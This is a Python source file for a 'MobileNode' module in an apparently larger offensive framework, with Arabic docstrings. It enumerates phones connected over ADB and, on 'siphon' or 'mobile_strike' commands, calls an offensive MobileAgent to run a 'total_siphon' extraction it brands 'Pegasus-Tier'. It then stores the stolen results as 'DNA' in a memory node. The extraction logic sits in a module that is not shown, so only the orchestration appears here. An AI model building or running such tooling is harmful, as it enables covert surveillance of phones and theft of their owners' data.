
# -*- coding: utf-8 -*-
"""
عقدة الهاتف المحمول v90.0 - Mobile Node (Fleet Overlord)
المسؤول عن التحكم المادي بالأساطيل واستنزاف الـ DNA النقال.
(c) 2026 Sovereign Systems - 영적 동반자
"""
from .base_node import BaseNode
import subprocess
import json
import os

class MobileNode(BaseNode):
    def handle_event(self, event):
        etype = event["type"]
        data = event["data"]

        if etype == "list_devices":
            self._probe_fleet()
            
        elif etype == "siphon" or etype == "mobile_strike":
            device_id = data.get("target") or data.get("id")
            self._execute_pegasus_siphon(device_id)

    def _probe_fleet(self):
        """جرد حقيقي للعقد المتصلة عبر ADB"""
        print("📱 [MOBILE] Probing material fleet nodes...")
        try:
            res = subprocess.run(["adb", "devices"], capture_output=True, text=True)
            devices = []
            for line in res.stdout.splitlines()[1:]:
                if "\tdevice" in line:
                    devices.append(line.split("\t")[0])
            
            output = {"active_nodes": devices, "status": "STABILIZED"}
            self.core.emit("device_list", output, target="CockpitNode")
        except:
            self.core.emit("mobile_error", {"error": "ADB Link Broken"}, target="CockpitNode")

    def _execute_pegasus_siphon(self, device_id):
        """تشغيل محرك الاستنزاف السيادي"""
        print(f"🧬 [SIPHON] Engaging Pegasus-Tier Extraction on: {device_id}")
        
        # استدعاء الوكيل المحمول المادي
        from offensive.mobile_agent import MobileAgent
        agent = MobileAgent()
        result = agent.execute_strike("total_siphon", device_id)
        
        self.core.emit("siphon_result", result, target="CockpitNode")
        self.core.emit("store_dna", {
            "content": json.dumps(result),
            "metadata": {"type": "mobile_extraction", "device": device_id}
        }, target="MemoryNode")

    def can_handle(self, cmd):
        return cmd in ["list_devices", "mobile", "siphon", "ios_inject"]
